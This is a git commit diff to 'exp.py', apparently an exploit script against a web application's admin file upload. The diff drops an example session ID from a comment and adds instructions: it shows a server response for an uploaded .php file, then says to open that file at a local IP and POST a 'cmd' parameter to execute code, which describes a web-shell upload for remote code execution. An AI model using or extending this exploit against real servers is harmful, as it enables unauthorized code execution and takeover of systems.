094a54940e3492b5f23d5598fd59807583137c72
yuechangyuan <54811068+yuechangyuan@users.noreply.github.com>
2020-04-08 20:47:18 +0800

    Update exp.py

--- exp.py
+++ exp.py
@@ -2,7 +2,7 @@ import requests
 
 
 '''
-after logged in as admin  ,for example your session is  8qva8t0pfm8sglakdai9ctolg1.
+after logged in as admin 
 '''
 
 
@@ -29,5 +29,15 @@ print(r.text)
 
 '''
 get upload path  
+
+for example 
+
+{"status":"y","info":"文件上传成功",
+"url":"\/upload\/20200408\/e04236222373ddc238d016c390d38cc0.php",
+"ext":"php",
+"name":"e04236222373ddc238d016c390d38cc0"}
+
+then open http://192.168.0.128:80/upload/20200408/e04236222373ddc238d016c390d38cc0.php and POST cmd to execute code
 '''
+
 
